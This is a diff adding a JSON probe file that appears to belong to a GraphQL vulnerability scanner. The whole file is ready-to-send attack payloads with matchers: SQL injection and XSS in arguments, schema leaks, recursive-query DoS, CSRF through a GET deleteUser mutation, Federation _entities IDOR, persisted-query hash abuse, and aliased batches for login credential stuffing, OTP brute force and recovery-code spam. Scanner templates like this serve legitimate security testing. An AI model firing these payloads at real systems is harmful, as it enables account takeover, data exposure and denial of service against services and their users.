@@ -1,0 +1,852 @@
+{
+  "category": "graphql",
+  "contexts": {
+    "introspection": {
+      "description": "GraphQL introspection query \u2014 enumerate entire schema",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"query\":\"{__schema{types{name kind fields{name type{ofType{name}}}}}}\"}",
+          "description": "Full introspection query to enumerate schema types and fields",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "__schema",
+                "types",
+                "fields"
+              ],
+              "condition": "and"
+            }
+          ],
+          "severity": "medium",
+          "confidence_boost": 35
+        },
+        {
+          "payload": "{\"query\":\"{__type(name:\\\"Query\\\"){name fields{name args{name type{name}}}}}\" }",
+          "description": "Targeted introspection of Query root type",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "Query",
+                "fields"
+              ],
+              "condition": "and"
+            }
+          ],
+          "severity": "medium",
+          "confidence_boost": 30
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "GET-based introspection bypass: GET /graphql?query={__schema{types{name}}} \u2014 bypasses POST-only introspection blocks",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "__schema"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "medium",
+          "confidence_boost": 30,
+          "variables": {
+            "method": "GET",
+            "query_param": "{__schema{types{name}}}"
+          }
+        }
+      ]
+    },
+    "depth_attack": {
+      "description": "GraphQL nested query depth attack (DoS)",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"query\":\"{a:__typename b:__typename c:__typename d:__typename e:__typename f:__typename g:__typename h:__typename i:__typename j:__typename}\"}",
+          "description": "Alias-based batch query (10 aliases in single request)",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "words": [
+                "__typename"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "low",
+          "confidence_boost": 15
+        }
+      ]
+    },
+    "field_suggestion": {
+      "description": "GraphQL field suggestion exploitation \u2014 leak schema via typos",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"query\":\"{userss{id}}\"}",
+          "description": "Misspelled field to trigger 'Did you mean' suggestions",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "Did you mean",
+                "suggestion"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "low",
+          "confidence_boost": 20
+        }
+      ]
+    },
+    "injection": {
+      "description": "GraphQL injection via resolver arguments",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"query\":\"{user(id:\\\"1' OR '1'='1\\\"){id name email}}\"}",
+          "description": "SQL injection via GraphQL resolver argument",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "sql",
+                "syntax",
+                "error",
+                "unclosed"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 45
+        }
+      ]
+    },
+    "mutation_injection": {
+      "description": "Injection via GraphQL mutations \u2014 SQLi/XSS in mutation arguments",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"query\":\"mutation{createUser(name:\\\"admin' OR '1'='1\\\"){id}}\"}",
+          "description": "SQLi in mutation argument \u2014 look for SQL error in response",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "sql",
+                "error",
+                "syntax",
+                "ORA-",
+                "pg_"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 45
+        },
+        {
+          "payload": "{\"query\":\"mutation{createUser(name:\\\"<script>alert(1)</script>\\\"){id}}\"}",
+          "description": "XSS via mutation argument \u2014 check if payload reflected in response",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "<script>alert(1)</script>"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "medium",
+          "confidence_boost": 35
+        }
+      ]
+    },
+    "directive_overloading": {
+      "description": "GraphQL directive overloading \u2014 DoS via many directives on single field",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"query\":\"{__typename @aa @bb @cc @dd @ee @ff @gg @hh @ii @jj}\"}",
+          "description": "Abuse @skip/@include directives with many unknown directives \u2014 may trigger 500 or severe slowdown",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                500
+              ]
+            }
+          ],
+          "severity": "medium",
+          "confidence_boost": 25
+        }
+      ]
+    },
+    "persisted_query_bypass": {
+      "description": "Automatic Persisted Query (APQ) bypass \u2014 access cached operations via hash",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"deadbeef\"}}}",
+          "description": "APQ probe \u2014 server may reveal supported operations or error with PersistedQuery info",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "PersistedQuery",
+                "persistedQuery",
+                "persisted"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "low",
+          "confidence_boost": 20
+        }
+      ]
+    },
+    "batch_array": {
+      "description": "GraphQL batch query via JSON array \u2014 bypasses per-operation rate limiting",
+      "tech_match": [
+        "GraphQL",
+        "Apollo",
+        "Express",
+        "Node.js"
+      ],
+      "param_match": [
+        "query",
+        "graphql"
+      ],
+      "probes": [
+        {
+          "payload": "[{\"query\":\"{__typename}\"},{\"query\":\"{__typename}\"},{\"query\":\"{__typename}\"},{\"query\":\"{__typename}\"},{\"query\":\"{__typename}\"}]",
+          "description": "Array batch with 5 queries \u2014 check if all execute (response is array of 5 results)",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "__typename"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "medium",
+          "confidence_boost": 30
+        }
+      ]
+    },
+    "subscription_discovery": {
+      "description": "GraphQL subscription endpoint discovery \u2014 often has weaker auth than query endpoints",
+      "tech_match": [
+        "GraphQL",
+        "Apollo",
+        "Express",
+        "Node.js"
+      ],
+      "param_match": [
+        "query",
+        "graphql"
+      ],
+      "probes": [
+        {
+          "payload": "{\"type\":\"connection_init\",\"payload\":{}}",
+          "description": "WebSocket subscription handshake \u2014 check if subscription endpoint accepts connections",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "connection_ack",
+                "ka"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "low",
+          "confidence_boost": 20
+        }
+      ]
+    },
+    "alias_amplification": {
+      "description": "Query complexity attack via aliases \u2014 one request, many operations. Critical use case: bypass rate-limit on auth/login.",
+      "tech_match": [
+        "GraphQL",
+        "Apollo",
+        "Express"
+      ],
+      "param_match": [
+        "query",
+        "graphql"
+      ],
+      "probes": [
+        {
+          "payload": "{\"query\":\"{a1:__typename a2:__typename a3:__typename a4:__typename a5:__typename a6:__typename a7:__typename a8:__typename a9:__typename a10:__typename a11:__typename a12:__typename a13:__typename a14:__typename a15:__typename a16:__typename a17:__typename a18:__typename a19:__typename a20:__typename}\"}",
+          "description": "20 aliased operations in single query \u2014 test query depth/complexity limits",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "__typename"
+              ]
+            }
+          ],
+          "severity": "medium",
+          "confidence_boost": 25
+        },
+        {
+          "payload": "{\"query\":\"{a:login(user:\\\"x\\\",pass:\\\"1\\\") b:login(user:\\\"x\\\",pass:\\\"2\\\") c:login(user:\\\"x\\\",pass:\\\"3\\\") d:login(user:\\\"x\\\",pass:\\\"4\\\") e:login(user:\\\"x\\\",pass:\\\"5\\\")}\"}",
+          "description": "Aliased login \u2014 5 password attempts in one HTTP request bypasses rate-limit (1 HTTP request = 1 attempt). Scale to 100+ for credential stuffing.",
+          "matchers": [
+            {
+              "type": "word",
+              "any": [
+                "token",
+                "session",
+                "user"
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "rate limit"
+              ]
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 60
+        }
+      ]
+    },
+    "persisted_query_hash_attacks": {
+      "description": "Persisted query / APQ attacks \u2014 hash-query mismatch, anonymous replay, hash collision.",
+      "tech_match": [
+        "GraphQL",
+        "Apollo",
+        "Relay"
+      ],
+      "param_match": [
+        "query",
+        "operationName",
+        "extensions",
+        "persistedQuery"
+      ],
+      "probes": [
+        {
+          "payload": "{\"query\":\"mutation{login(user:\\\"victim\\\",pass:\\\"x\\\")}\",\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"0000000000000000000000000000000000000000000000000000000000000000\"}}}",
+          "description": "Hash-query mismatch \u2014 server SHOULD reject if sha256(query) != hash. Some libs trust the query when hash is wrong, allowing arbitrary mutation under whitelisted hash.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "data",
+                "errors"
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "MismatchedQueryHash",
+                "PersistedQueryNotSupported"
+              ]
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 65
+        },
+        {
+          "payload": "{\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"<known_admin_query_hash>\"}}}",
+          "description": "Replay known admin-query hash without auth headers. Some APQ caches don't tie hashes to user/role \u2014 admin queries become anonymous-callable.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "admin",
+                "users",
+                "roles"
+              ]
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 70,
+          "variables": {
+            "manual_chain": true
+          }
+        }
+      ]
+    },
+    "csrf_via_get": {
+      "description": "GraphQL over GET \u2014 server accepts queries via GET parameters, opening CSRF surface for state-changing mutations.",
+      "tech_match": [
+        "GraphQL"
+      ],
+      "param_match": [
+        "query"
+      ],
+      "probes": [
+        {
+          "payload": "?query=mutation{deleteUser(id:1)}",
+          "description": "Issue mutation via GET. If server processes, CSRF is trivial via <img src=...>",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "GET method not allowed",
+                "method_not_allowed"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {
+            "method": "GET"
+          }
+        }
+      ]
+    },
+    "deep_recursion": {
+      "description": "Schema cycle exploitation \u2014 recursively self-referential types lead to exponential expansion.",
+      "tech_match": [
+        "GraphQL"
+      ],
+      "param_match": [
+        "query"
+      ],
+      "probes": [
+        {
+          "payload": "{\"query\":\"{user(id:1){posts{author{posts{author{posts{author{posts{author{posts{id}}}}}}}}}}}\"}",
+          "description": "10-level deep recursion. If accepted (no max-depth limit) and timing >2x baseline, DoS confirmed.",
+          "matchers": [
+            {
+              "type": "timing",
+              "min_ms": 5000
+            },
+            {
+              "type": "status",
+              "status": [
+                200,
+                502,
+                504
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 45
+        }
+      ]
+    },
+    "federation_service_exposure": {
+      "description": "Apollo Federation gateways expose `_service` and `_entities` fields. `_service.sdl` returns the FULL federated schema (often with internal subgraph types), bypassing introspection-disabled gateways. `_entities` allows cross-subgraph entity resolution which often skips per-subgraph auth.",
+      "tech_match": [
+        "GraphQL",
+        "Apollo",
+        "Federation"
+      ],
+      "param_match": [
+        "query",
+        "graphql"
+      ],
+      "probes": [
+        {
+          "payload": "{\"query\":\"{ _service { sdl } }\"}",
+          "description": "Apollo Federation _service.sdl \u2014 leaks full federated schema even when introspection is disabled. SDL contains internal types, directives, and subgraph composition.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "sdl",
+                "type ",
+                "@key",
+                "@external"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        },
+        {
+          "payload": "{\"query\":\"query($r:[_Any!]!){ _entities(representations:$r){ ...on User { id email role } } }\",\"variables\":{\"r\":[{\"__typename\":\"User\",\"id\":\"<victim_id>\"}]}}",
+          "description": "_entities cross-subgraph IDOR \u2014 gateway resolves entity by typename+key without per-subgraph auth check. Common bug: User subgraph trusts gateway-asserted ID without verifying caller.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "email",
+                "role",
+                "id"
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "forbidden",
+                "unauthorized"
+              ]
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 65
+        },
+        {
+          "payload": "{\"query\":\"{ _service { sdl } _entities(representations:[]){ __typename } }\"}",
+          "description": "Combined _service + _entities probe \u2014 distinguishes Apollo Federation from monolithic GraphQL.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "_service",
+                "_entities",
+                "sdl"
+              ]
+            }
+          ],
+          "severity": "low",
+          "confidence_boost": 30
+        },
+        {
+          "payload": "{\"query\":\"{ user(id:1) @requires(fields:\\\"id\\\") { internalRole } }\"}",
+          "description": "@requires / @provides directive bypass \u2014 gateway-only directives that subgraphs may not enforce. internalRole may be exposed to caller without proper auth.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "internalRole",
+                "role",
+                "admin"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 45
+        }
+      ]
+    },
+    "union_type_inline_fragment_leak": {
+      "description": "GraphQL union types (e.g. SearchResult = User | Post | Document). Inline fragments on union let attacker request fields from types they shouldn't see (admin-only, deleted documents).",
+      "tech_match": [
+        "GraphQL"
+      ],
+      "param_match": [
+        "query"
+      ],
+      "probes": [
+        {
+          "payload": "{\"query\":\"{search(q:\\\"\\\"){...on AdminUser{role permissions} ...on DeletedDocument{contents author}}}\"}",
+          "description": "Union inline fragment fetches admin-only or soft-deleted content. If returned in any branch, type-level auth is missing.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "AdminUser",
+                "permissions",
+                "DeletedDocument",
+                "contents"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        }
+      ]
+    },
+    "typo_field_suggestion": {
+      "description": "GraphQL field-suggestion mode (Apollo/graphql-js) \u2014 typo in query reveals correct field via 'Did you mean' error. Information disclosure.",
+      "tech_match": [
+        "graphql"
+      ],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{userrr(id:1){id}}",
+          "description": "Mistype field name \u2192 server suggests correct name. Confirms suggestion mode enabled (often misconfigured in prod).",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "Did you mean",
+                "did you mean"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "medium",
+          "confidence_boost": 50,
+          "variables": {
+            "method": "POST",
+            "content_type": "application/json"
+          }
+        }
+      ]
+    },
+    "partial_introspection": {
+      "description": "Partial introspection probe \u2014 even when full {__schema{...}} is blocked, single-field probes (queryType) may slip through WAF.",
+      "tech_match": [
+        "graphql"
+      ],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{__schema{queryType{name}}}",
+          "description": "1-field introspection \u2014 bypasses introspection-disabled WAF rule if rule matches only deep queries",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "queryType",
+                "Query"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "severity": "medium",
+          "confidence_boost": 45,
+          "variables": {
+            "method": "POST",
+            "content_type": "application/json"
+          }
+        }
+      ]
+    },
+    "subscription_protocol_drift_2025": {
+      "description": "GraphQL subscription endpoints commonly support BOTH graphql-ws (modern) and subscriptions-transport-ws (legacy) protocols. Auth gating frequently differs between protocols \u2014 legacy protocol may skip auth/origin/CSRF checks the modern protocol enforces. 2025 H2 OWASP API Security research.",
+      "tech_match": [
+        "graphql",
+        "graphql-ws",
+        "apollo",
+        "mercurius"
+      ],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Send WebSocket upgrade with Sec-WebSocket-Protocol: graphql-transport-ws (modern) vs subscriptions-transport-ws (legacy). Compare accepted protocols + whether auth differs. Active in W18.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                101
+              ]
+            },
+            {
+              "type": "header",
+              "name": "Sec-WebSocket-Protocol",
+              "contains": "subscriptions-transport-ws"
+            }
+          ],
+          "severity": "medium",
+          "confidence_boost": 45,
+          "variables": {
+            "method": "GET",
+            "header_inject": {
+              "Upgrade": "websocket",
+              "Connection": "Upgrade",
+              "Sec-WebSocket-Protocol": "subscriptions-transport-ws"
+            },
+            "manual_chain": true
+          }
+        }
+      ]
+    },
+    "subscription_auth_skip_legacy_protocol": {
+      "description": "Subscribe to a privileged stream (e.g. !subscription { adminEvents { ... } }) over the legacy protocol. If accepted unauth where modern protocol rejects, auth gating drift confirmed.",
+      "tech_match": [
+        "graphql",
+        "apollo"
+      ],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "subscription { adminEvents { id type } }",
+          "description": "Send privileged subscription over legacy protocol; modern protocol would 401, legacy may accept.",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "data",
+                "adminEvents"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "unauthorized",
+                "forbidden",
+                "must be logged in"
+              ],
+              "condition": "and"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {
+            "manual_chain": true
+          }
+        }
+      ]
+    },
+    "apollo_federation_field_authz_drift_2025": {
+      "description": "Apollo Federation field-level authz drift \u2014 entity resolution authorised but per-field guards on the resolved type missed by subgraph. Distinct from federation_service_exposure (which covers entity-level IDOR via _entities): this is FIELD-LEVEL \u2014 same victim entity is fetched legitimately, but @requires/@inaccessible fields on the type are leaked through. 2025 wave: subgraphs assume gateway enforces field-level @inaccessible / @authenticated directives, gateway assumes subgraph does.",
+      "tech_match": [
+        "GraphQL",
+        "Apollo",
+        "Federation"
+      ],
+      "param_match": [
+        "query",
+        "graphql"
+      ],
+      "probes": [
+        {
+          "payload": "{\"query\":\"query($r:[_Any!]!){ _entities(representations:$r){ ...on User { id email internalRole apiKey lastIpAddress paymentMethodDigits }}}\",\"variables\":{\"r\":[{\"__typename\":\"User\",\"id\":\"<self_id>\"}]}}",
+          "description": "Fetch SELF entity via _entities and request fields normally hidden by gateway @inaccessible directives (internalRole / apiKey / lastIpAddress / paymentMethodDigits). Subgraph that resolves directly leaks these because @inaccessible is gateway-only metadata. Use self ID first to avoid Rule 7 / Rule 8 \u2014 proves the field exposure without touching another user.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "internalRole",
+                "apiKey",
+                "lastIpAddress",
+                "paymentMethodDigits"
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "null"
+              ],
+              "condition": "and"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        },
+        {
+          "payload": "{\"query\":\"query($r:[_Any!]!){ _entities(representations:$r){ ...on Account { id internalNotes adminFlags }}}\",\"variables\":{\"r\":[{\"__typename\":\"Account\",\"id\":\"<self_account>\"}]}}",
+          "description": "Account entity \u2014 operator-internal fields. Same pattern: subgraph resolves type directly, returning admin-only fields the gateway would have filtered via @inaccessible / @authenticated.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "internalNotes",
+                "adminFlags",
+                "auditTrail"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        }
+      ]
+    },
+    "graphql_mutation_aliasing_account_recovery_dos_2026": {
+      "description": "HackerOne disclosed pattern (high-frequency 2025-2026 H1) — single GraphQL request issues N aliased mutations against a rate-limited recovery endpoint (forgot-password, MFA-resend, phone-verification). Server processes each alias as a distinct call but the per-IP rate limiter sees ONE request; effectively bypasses the limiter by a factor of N. Used for SMS/email spam-bombing, recovery-code exhaustion, account-DoS. Distinct from generic rate-limit absence — this is rate-limit BYPASS via the GraphQL query layer.",
+      "tech_match": ["graphql", "apollo", "hasura", "absinthe", "graphene"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"query\": \"mutation { a1: sendRecoveryCode(email: \\\"victim@x.tld\\\") b1: sendRecoveryCode(email: \\\"victim@x.tld\\\") c1: sendRecoveryCode(email: \\\"victim@x.tld\\\") d1: sendRecoveryCode(email: \\\"victim@x.tld\\\") e1: sendRecoveryCode(email: \\\"victim@x.tld\\\") }\"}",
+          "description": "5 aliased mutations to sendRecoveryCode in one request. Vulnerable server processes all 5; rate-limiter sees ONE request. Confirm out-of-band (count SMS/email delivered to operator-owned victim) OR via aliased-field reflection in JSON response.",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "regex", "pattern": "\"a1\".*\"b1\".*\"c1\".*\"d1\".*\"e1\""}
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {"manual_chain": true, "content_type": "application/json", "needs_oob_confirmation": true}
+        },
+        {
+          "payload": "{\"query\": \"mutation { a: verifyOtp(code: \\\"000000\\\") b: verifyOtp(code: \\\"111111\\\") c: verifyOtp(code: \\\"222222\\\") d: verifyOtp(code: \\\"333333\\\") e: verifyOtp(code: \\\"444444\\\") }\"}",
+          "description": "Brute-force aliased OTP attempts. Rate-limit bypass + brute-force in one request. Any success-shape (token/verified:true) in any alias = CRITICAL: OTP brute-forceable.",
+          "matchers": [
+            {"type": "regex", "pattern": "\"(?:verifyOtp|verify_otp)\".*(?:success|token|verified|true)"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {"manual_chain": true, "content_type": "application/json"}
+        }
+      ]
+    }
+  }
+}
